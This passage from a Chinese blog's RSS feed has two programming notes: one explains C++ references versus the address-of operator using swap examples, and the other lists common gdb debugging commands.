&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.cnblogs.com/Mr-xu/archive/2012/08/07/2626973.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.c里面&amp;amp;只用作`取地址`的功能,c++中不但有此功能还新增了`引用`的功能

2.&amp;amp;作为c++中的引用功能时,在声明一个引用时不分配新内存,是被引用变量的别名,引用在声明时必须赋值

3.eg.
int a=1
int &amp;amp;b=a;引用    
c=&amp;amp;a;取地址
d=&amp;amp;b;取地址
在第2句中=左边的&amp;amp;符号是引用,第3|4句中的&amp;amp;是取地址,最后的结果是c与d相等

4.&amp;amp;和类型在一起的是引用,和变量在一起的是取地址
eg.
int func(int &amp;amp;a)
{};引用

5.不能建立引用的数组,因为数组是由元素组成,不能由&quot;别名&quot;组成,可以建立数组的引用(引用即别名)

6.引用的好处
void swap(int &amp;amp;a,int &amp;amp;b)
{
int c=a;a=b;b=c;
}
在swap函数被调用时如果两个参数是指针而不是引用,那么在形参转成实参的过程将申请新的内存,如果两个参数是引用则不用
新申请内存来存放两个实参
eg.
int main()
{
cin&amp;gt;&amp;gt;former&amp;gt;&amp;gt;latter;
swap(former,latter);
cout&amp;lt;&amp;lt;former&amp;lt;&amp;lt;latter;
}
这里main函数调用swap函数时如果输入的是2,3,main函数中调用swqp(2,3)时对应swap函数中:
swap函数中认为2的别名是former,3的别名是latter,swap函数认为a即是former,b即是latter,也即在swap函数调用时运行如下:
int &amp;amp;a=former;
int &amp;amp;b=latter;
int c=a;
a=b;
b=c;
这样就可直接操作main函数空间中的former和latter变量,从而不用再在swap函数中新申请内存并操作
实例:
------1.cpp-----
#include &amp;lt;iostream&amp;gt;
using namespace std;
void swap(int &amp;amp;a,int &amp;amp;b)
{
    int c=a;
    a=b;
    b=c;
}
int main()
{
    int former,latter;
    cin&amp;gt;&amp;gt;former&amp;gt;&amp;gt;latter;
    swap(former,latter);
    cout&amp;lt;&amp;lt;former&amp;lt;&amp;lt;latter;
    return 0;

}
-------end------
g++ 1.cpp -o 1
./1
输入
1111
2222
输出
22221111

------2.cpp------
#include &amp;lt;iostream&amp;gt;
using namespace std;
void swap(int a,int b)
{
    int c=a;
    a=b;
    b=c;
}
int main()
{
    int former,latter;
    cin&amp;gt;&amp;gt;former&amp;gt;&amp;gt;latter;
    swap(former,latter);
    cout&amp;lt;&amp;lt;former&amp;lt;&amp;lt;latter;
    return 0;

}
-------end-------
g++ 2.cpp -o 2
./2
输入
1111
2222
输出
11112222
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 25 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/04/25/c++%E4%B8%AD%E7%9A%84&%E7%9A%84%E7%94%A8%E6%B3%95/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/04/25/c++%E4%B8%AD%E7%9A%84&%E7%9A%84%E7%94%A8%E6%B3%95/</guid>
        
        <category>c/c++</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>gdb命令</title>
        <description>&lt;h3 id=&quot;0x01-gdb常用命令&quot;&gt;0x01 gdb常用命令&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb
help
help data
help stack
help status

gdb stack0           #===&amp;gt;gdb + file stack0
l(list)              #show source
b 7(break 7)         #add break on line7
b 8(break 8)         #add break on line8
b 11
b 13
b 15
info b(info break)
info registers       #show registers
r(run)               #第一次运行或重新开始运行程序
start                #开始运行程序
continue             #继续运行
disas /m
            /r      #show hex(显示汇编指令对应十六进制值)
            /m      #show source if available(如果有源码,显示对应行源码)
set disassembly-flavor att/intel     #设置att或intel格式
set disassemble-next-line            #设置下一步是否显示汇编码
si或s(setpi)                            #==&amp;gt; step into,like f7 in od
ni或n(nexti)                            #==&amp;gt; like f8 in od
leave                #立即中断当前函数运行并返回,当前函数的剩余语句将不被执行
finish               #执行到当前函数返回之后停止,当前函数的剩余语句将正常运行
bt(backtrace)        #查看所有栈帧信息
f num(frame num)     #选择并打印第num个栈帧信息
info f(info frame)   #查看当前栈帧信息

layout:用于分割窗口,可以一边查看代码,一边测试:
layout src:显示源代码窗口
layout asm:显示反汇编窗口
layout regs:显示源代码/反汇编和CPU寄存器窗口
layout split:显示源代码和反汇编窗口
Ctrl + L:刷新窗口
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 20 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/20/gdb%E5%91%BD%E4%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/20/gdb%E5%91%BD%E4%BB%A4/</guid>
        
        <category>gdb</category>
        
        <category>commands</category>
        
        <category>linux</category>
        
        
        <category>web</category>
        
      </item>
    
  </channel>
</rss>
